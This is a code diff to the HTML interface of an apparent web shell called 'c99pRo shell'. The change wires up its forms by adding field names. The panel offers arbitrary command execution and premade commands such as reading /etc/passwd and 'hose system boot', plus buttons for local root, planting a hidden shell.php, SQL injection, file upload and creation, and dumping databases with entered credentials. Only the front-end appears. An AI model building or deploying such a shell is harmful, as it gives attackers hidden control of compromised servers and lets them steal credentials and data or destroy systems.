@@ -157,19 +157,19 @@
         <h3>command execute</h3>
         <div class="part-left">
             <form method="POST" action="">
-                <input type="text" placeholder="cmd-to-run" />
-                <input type="submit" value="execute" />
+                <input type="text" placeholder="cmd-to-run" name="cmd" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <div class="part-right">
             <form method="POST" action="">
-                <select>
+                <select name="cmd">
                     <option value="none">:: premade commands ::</option>
                     <option>show open ports</option>
                     <option>hose system boot</option>
                     <option>show /etc/passwd</option>
                 </select>
-                <input type="submit" value="execute" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
     </div>
@@ -179,20 +179,20 @@
         <div class="part-left">
             <form method="POST" action="">
                 <span class="xdp">local root</span>
-                <input type="submit" value="execute" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <div class="part-right">
             <form method="POST" action="">
                 <span class="xdp">ghost shell.php</span>
-                <input type="submit" value="execute" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <hr />
         <div class="part-left">
             <form method="POST" action="">
                 <span class="xdp">sqlicate</span>
-                <input type="submit" value="execute" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <div class="part-right">
@@ -207,34 +207,34 @@
         <div class="part-left">
             <form method="POST" action="">
                 <span class="xdp">search</span>
-                <input type="text" value="^(.*)" />
+                <input type="text" name="search" value="^(.*)" />
                 <label>
-                    <input type="checkbox" checked />
+                    <input type="checkbox" name="regex" checked />
                     regex
                 </label>
-                <input type="submit" value="execute" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <div class="part-right">
             <form method="POST" action="">
                 <span class="xdp">upload</span>
-                <input type="file" />
-                <input type="submit" value="upload" />
+                <input type="file" name="upload" />
+                <input type="submit" name="submit" value="upload" />
             </form>
         </div>
         <hr />
         <div class="part-left">
             <form method="POST" action="">
                 <span class="xdp">mkdir</span>
-                <input type="text" placeholder="/some/dir" />
-                <input type="submit" value="execute" />
+                <input type="text" name="dir" placeholder="/some/dir" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <div class="part-right">
             <form method="POST" action="">
                 <span class="xdp">mkfile</span>
-                <input type="text" placeholder="/some/file.txt" />
-                <input type="submit" value="execute" />
+                <input type="text" name="file" placeholder="/some/file.txt" />
+                <input type="submit" name="submit" value="execute" />
             </form>
         </div>
         <hr />
@@ -244,22 +244,22 @@
                 <table class="colon-f align-center">
                     <tr>
                         <td>DB host</td>
-                        <td><input type="text" /></td>
+                        <td><input type="text" name="host" /></td>
                     </tr>
                     <tr>
                         <td>DB user</td>
-                        <td><input type="text" /></td>
+                        <td><input type="text" name="user" /></td>
                     </tr>
                     <tr>
                         <td>DB pass</td>
-                        <td><input type="text" /></td>
+                        <td><input type="text" name="pass" /></td>
                     </tr>
                     <tr>
                         <td>DB name</td>
-                        <td><input type="text" /></td>
+                        <td><input type="text" name="name" /></td>
                     </tr>
                     <tr>
-                        <td colspan="2" style="text-align: right;"><input type="submit" value="dump" /></td>
+                        <td colspan="2" style="text-align: right;"><input type="submit" name="submit" value="dump" /></td>
                 </table>
             </form>
         </div>
@@ -269,7 +269,7 @@
     </div>
 
     <div class="part tiny" style="text-align: center;">
-        --[ c99pRo shell {{ v_shellver }} - <u>cracked by {unnamed}</u> ]--
+        --[ c99pRo shell {{ v_shellver }} - <u>cracked by {AN0nYMOUS}</u> ]--
     </div>
 </body>
 </html>
